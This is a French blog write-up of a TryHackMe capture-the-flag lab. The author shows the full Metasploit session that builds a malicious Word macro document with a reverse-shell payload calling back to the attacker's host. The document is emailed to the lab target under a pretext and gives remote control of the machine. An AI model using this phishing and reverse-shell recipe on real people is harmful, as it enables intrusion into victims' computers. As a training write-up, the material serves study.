---
title: TryHackMe - Ghost Phishing
date: 2025-03-24 17:46:19 -0400
description: Dans le cadre du HackfinityBattle, un événement organisé par TryHackMe, ce challenge de cybersécurité m’a demandé de simuler une attaque Red Team en exploitant une vulnérabilité liée à l’ouverture d’un document Microsoft Word. L’objectif était de créer un document Word malveillant contenant une macro, capable d’exécuter une charge utile (payload) à l’ouverture, et de l’envoyer à la cible, cipher@darknetmail.corp, en s’assurant qu’elle l’ouvre pour établir une connexion à distance. Ce défi, proposé par TryHackMe, visait à tester mes compétences en Red Team, notamment en génération de payloads avec Metasploit, en création de documents malveillants via des macros, en ingénierie sociale pour inciter la cible à ouvrir le fichier, et en gestion de sessions à distance dans un environnement contrôlé.
categories: [TryHackMe]
tags: [THM, CTFs, Hacking, macro, word, msfconsole]
image:
    path: https://i.ibb.co/fY9ysQ9r/gh.png
---


- **[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g)**.
- **[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


<h2 style="color: orange;">Description</h2>
Nous avons réussi à accéder à l'e-mail de **DarkSpecter**, et cette fuite contient un lien direct avec les dernières opérations de **Cipher**. Les échanges chiffrés contiennent des renseignements précieux : des informations sur les attaques récentes, les systèmes compromis et les cibles potentielles. Cela pourrait être notre meilleure chance de prévoir les prochaines actions de Cipher et de démanteler définitivement son réseau.

<h2 style="color: orange;">Resolution</h2>
D'abord, je me suis connecté à l'adresse email fournie dans le cadre du challenge pour analyser les communications et mieux comprendre les attentes. 

![Email](https://i.ibb.co/wFvmjr51/r.png)

Ici, comme on le constate, pour faire un briefing, `cipher@darknetmail.corp` demande à `specter@darknetmail.corp` de lui fournir un rapport détaillé sur une opération récente. Le message, envoyé le **1er mars 2025**, mentionne des préoccupations suite à une attaque et insiste sur l’urgence de recevoir un rapport complet, incluant les méthodologies, les outils utilisés et les anomalies rencontrées. L’email précise également que le rapport doit être envoyé directement via ce canal.

En analysant ce message, j’ai compris que l’objectif était de créer un **document Word** avec une **macro** malveillante pour répondre à cette demande, en y intégrant une charge utile (payload) qui s’exécuterait à l’ouverture du fichier par la cible, `cipher@darknetmail`.corp. Pour ce faire, j’ai décidé de générer un payload en utilisant `msfconsole`, l’interface de Metasploit, afin de concevoir une attaque efficace.



Avant de commencer, j’ai vérifié la disponibilité d’un module adapté pour une attaque par **macro** sur ma version de `Kali Linux`. J’ai utilisé `searchsploit` pour rechercher des exploits liés aux macros :



```console
$ searchsploit macro
```

![Result](https://i.ibb.co/bggq4rm6/r-1.png)

Le résultat m’a montré plusieurs options, et j’ai décidé de sélectionner le premier exploit disponible : `LibreOffice < 6.0.7 / 6.1.3 - Macro Code Execution`. Cependant, pour ce challenge, j’ai utilisé un module `Metasploit` spécifique pour **Microsoft Word**. J’ai donc lancé `msfconsole` et configuré l’exploit comme suit :

```console
$ msf6 > use exploit/multi/fileformat/office_word_macro
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
$ msf6 exploit(multi/fileformat/office_word_macro) > set payload windows/shell_reverse_tcp 
payload => windows/shell_reverse_tcp
$ msf6 exploit(multi/fileformat/office_word_macro) > set lhost tun0 
lhost => 10.6.8.193
$ msf6 exploit(multi/fileformat/office_word_macro) > set lport 1337
lport => 1337
$ msf6 exploit(multi/fileformat/office_word_macro) > set filename hacked.docm
filename => hacked.docm
$ msf6 exploit(multi/fileformat/office_word_macro) > run
[*] Using template: /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx
[*] Injecting payload in document comments
[*] Injecting macro and other required files in document
[*] Finalizing docm: hacked.docm
[+] hacked.docm stored at /home/bloman/.msf4/local/hacked.docm
```

Le module a généré avec succès un **document Word** malveillant nommé `hacked.docm`, contenant une **macro** qui exécutera le payload à l’ouverture. Ensuite, j’ai mis en place un listener avec `netcat` pour recevoir la connexion une fois que la cible ouvrirait le document

J’ai ensuite envoyé le document `hacked.docm` à `cipher@darknetmail.corp` via l’interface email.

![check](https://i.ibb.co/vxwNw5H6/hacked.png)

Quelques minutes plus tard, la cible a ouvert le document, ce qui a déclenché l’exécution de la **macro**. Cela m’a permis d’établir une connexion à distance et de prendre le contrôle de la machine de la cible :

![Hacked](https://i.ibb.co/ZRsnB6bM/r-hacked.png)






<h2 style="color: orange;">Ressources supplementaires</h2>
Voici quelques ressources supplémentaires qui pourraient vous être utiles :
- [Rapid7 Macro](https://www.rapid7.com/db/modules/exploit/multi/fileformat/office_word_macro/)
- [Medium](https://medium.com/@calvintconnor/how-to-make-a-reverse-shell-with-microsoft-word-macros-94797534ffb3)
- **Love my artciles?** Follow me on [Twitter](https://x.com/@bloman19) and [Github](https://github.com/0xabdoulaye)
- [Join Us on Discord](https://discord.gg/wBT9wr9ruG).
